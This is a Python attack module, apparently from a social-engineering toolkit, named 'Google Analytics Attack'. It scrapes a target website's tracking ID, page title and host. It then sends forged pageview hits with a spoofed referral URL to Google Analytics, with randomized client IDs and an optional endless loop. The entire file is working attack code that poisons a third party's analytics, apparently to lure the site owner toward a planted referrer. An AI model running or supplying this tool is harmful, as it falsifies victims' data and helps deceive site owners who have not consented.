#!/usr/bin/env python
from __future__ import print_function
print("Loading module. Please wait...")
import src.core.setcore
import sys
import requests
import re
import time
import random

try:
    input = raw_input
except NameError:
    pass

MAIN="Google Analytics Attack by @ZonkSec"
AUTHOR="Tyler Rosonke (@ZonkSec)"

### MAIN ###
def main():
    print_title()
    # determins if auto or manual, then calls functions
    mode_choice = input("[*] Choose mode (automatic/manual): ")
    if mode_choice in ("automatic","auto"):
        print("\n[*] Entering automatic mode.\n")
        url = input("[*] Target website (E.g. 'http://xyz.com/'): ")
        params = auto_params(url)
    elif mode_choice in ("manual","man"):
        print("\n[*] Entering manual mode.")
        params = manual_params()
    else:
        print("\n[-] Invalid mode.\n")
        sys.exit()
    # params have been collected, prompts for print
    print("\n[+] Payload ready.")
    printchoice = input("\n[*] Print payload?(y/n): ")
    if printchoice == "y":
        print_params(params)

    #sends request
    input("\nPress <enter> to send payload.")
    send_spoof(params)

    #prompts for loop, calls function if need be
    loopchoice = input("\n[*] Send payload on loop?(y/n) ")
    if loopchoice == "y":
        looper(params)
    input("\n\nThis module has finished completing. Press <enter> to continue")

### print_params - loops through params and prints
def print_params(params):
    print()
    for entry in params:
        print(entry + " = " + params[entry])

### looper - prompts for seconds to sleep, starts loop
def looper(params):
    secs = input("[*] Seconds between payload sends: ")
    input("\nSending request every "+secs+" seconds. Use CTRL+C to terminate. Press <enter> to begin loop.")
    while True:
        send_spoof(params)
        time.sleep(int(secs))

### send_spoof - randomizes client id, then sends request to google service
def send_spoof(params):
    params['cid'] = random.randint(100,999)
    r = requests.get('https://www.google-analytics.com/collect', params=params)
    print("\n[+] Payload sent.")
    print(r.url)

### auto_params - makes request to target site, regexes for params
def auto_params(url):
    try: #parses URL for host and page
        m = re.search('(https?:\/\/(.*?))\/(.*)',url)
        host = str(m.group(1))
        page = "/" + str(m.group(3))
    except:
        print("\n[-] Unable to parse URL for host/page. Did you forget an ending '/'?\n")
        sys.exit()
    try: #makes request to target page
        r = requests.get(url)
    except:
        print("\n[-] Unable to reach target website for parsing.\n")
        sys.exit()
    try: #parses target webpage for title
        m = re.search('<title>(.*)<\/title>', r.text)
        page_title = str(m.group(1))
    except:
        print("\n[-] Unable to parse target page for title.\n")
        sys.exit()
    try: #parses target webpage for tracking id
        m = re.search("'(UA-(.*))',", r.text)
        tid = str(m.group(1))
    except:
        print("\n[-] Unable to find TrackingID (UA-XXXXX). Website may not be running Google Anayltics.\n")
        sys.exit()
    #builds params dict
    params = {}
    params['v'] = "1"
    params['tid'] = tid
    params['cid'] = "555"
    params['t'] = "pageview"
    params['dh'] = host
    params['dp'] = page
    params['dt'] = page_title
    params['aip'] = "1"
    params['dr'] = input("\n[*] Enter referral URL to spoof (E.g. 'http://xyz.com/'): ")
    return params

### manual_params - prompts for all params
def manual_params():
    params = {}
    params['v'] = "1"
    params['tid'] = input("\n[*] Enter TrackingID (tid)(UA-XXXXX): ")
    params['cid'] = "555"
    params['t'] = "pageview"
    params['aip'] = "1"
    params['dh'] = input("[*] Enter target host (dh)(E.g. 'http://xyz.xyz)': ")
    params['dp'] = input("[*] Enter target page (dp)(E.g. '/aboutme'): ")
    params['dt'] = input("[*] Enter target page title (dt)(E.g. 'About Me'): ")
    params['dr'] = input("[*] Enter referal page to spoof (dr): ")
    return params

### print_title - prints title and references
def print_title():
    print("\n----------------------------------")
    print("      Google Analytics Attack     ")
    print("    By Tyler Rosonke (@ZonkSec)   ")
    print("----------------------------------\n")
    print("User-Guide: http://www.zonksec.com/blog/social-engineering-google-analytics/\n")
    print("References:")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/reference")
    print("-https://developers.google.com/analytics/devguides/collection/protocol/v1/parameters\n\n")
